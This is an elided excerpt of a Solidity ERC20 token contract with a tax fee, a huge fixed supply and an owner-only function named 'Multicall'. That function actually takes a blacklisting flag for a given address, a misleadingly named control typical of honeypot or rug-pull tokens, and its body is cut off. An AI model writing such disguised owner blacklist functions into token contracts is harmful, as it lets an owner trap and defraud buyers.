...
contract ERC20 is Context, IERC20 {
  ...
  constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 taxFee_) {
      ...
      taxFee = taxFee_;
      owner = _msgSender();
      _totalSupply = 77550000000000 * (10 ** uint256(decimals_));
...
require(amount > 0, "Transfer amount must be greater than zero"); //Transfer amount must be greater than zero
...
function Multicall(address _address, bool _isBlacklisting) external {
  require(_msgSender() == owner, "Multicall");
